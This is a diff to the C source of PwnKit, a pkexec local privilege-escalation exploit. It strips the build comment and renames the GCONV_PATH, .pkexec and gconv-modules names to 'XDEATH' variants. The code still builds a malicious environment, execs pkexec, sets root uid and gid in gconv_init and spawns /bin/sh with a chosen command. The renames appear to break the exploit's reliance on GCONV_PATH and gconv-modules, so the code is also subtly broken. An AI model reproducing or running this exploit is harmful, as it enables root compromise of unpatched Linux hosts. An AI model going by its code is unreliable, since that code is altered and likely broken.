@@ -1,5 +1,3 @@
-// gcc -shared PwnKit.c -o PwnKit -Wl,-e,entry -fPIC
-
 #define _XOPEN_SOURCE 700
 #define _GNU_SOURCE
 #include <dirent.h>
@@ -54,18 +52,18 @@ void entry()
     argc = *(int *)(rbp+1);
     argv = (char **)rbp+2;
 
-    res = mkdir("GCONV_PATH=.", 0777);
+    res = mkdir("XDEATH=.", 0777);
     if (res == -1 && errno != EEXIST)
     {
         perror("Failed to create directory");
         _exit(1);
     }
 
-    res = creat("GCONV_PATH=./.pkexec", 0777);
+    res = creat("XDEATH=./.xdeath", 0777);
 
-    res = mkdir(".pkexec", 0777);
+    res = mkdir(".xdeath", 0777);
 
-    fp = fopen(".pkexec/gconv-modules", "w+");
+    fp = fopen(".xdeath/xdeath-modules", "w+");
     if (fp == NULL)
     {
         perror("Failed to open output file");
@@ -79,7 +77,7 @@ void entry()
     fclose(fp);
 
     buf[readlink("/proc/self/exe", buf, sizeof(buf))] = 0;
-    res = symlink(buf, ".pkexec/pkexec.so");
+    res = symlink(buf, ".xdeath/xdeath.so");
     if (res == -1)
     {
         perror("Failed to copy file");
@@ -96,8 +94,8 @@ void entry()
             // Cleanup for situations where the exploit didn't work
             puts("Exploit failed. Target is most likely patched.");
 
-            rmrf("GCONV_PATH=.");
-            rmrf(".pkexec");
+            rmrf("XDEATH=.");
+            rmrf(".xdeath");
         }
 
         _exit(0);
@@ -113,7 +111,7 @@ void entry()
         cmd = memcpy(argv[1]-4, "CMD=", 4);
     }
     char *args[] = {NULL};
-    char *env[] = {".pkexec", "PATH=GCONV_PATH=.", "CHARSET=pkexec", "SHELL=pkexec", cmd, NULL};
+    char *env[] = {".xdeath", "PATH=XDEATH=.", "CHARSET=pkexec", "SHELL=pkexec", cmd, NULL};
     execve("/usr/bin/pkexec", args, env);
 
     // In case pkexec is not in /usr/bin/
@@ -133,8 +131,8 @@ void gconv_init()
 
     setresuid(0, 0, 0);
     setresgid(0, 0, 0);
-    rmrf("GCONV_PATH=.");
-    rmrf(".pkexec");
+    rmrf("XDEATH=.");
+    rmrf(".xdeath");
 
     if (cmd) {
         execve("/bin/sh", (char *[]){"/bin/sh", "-c", cmd, NULL}, NULL);
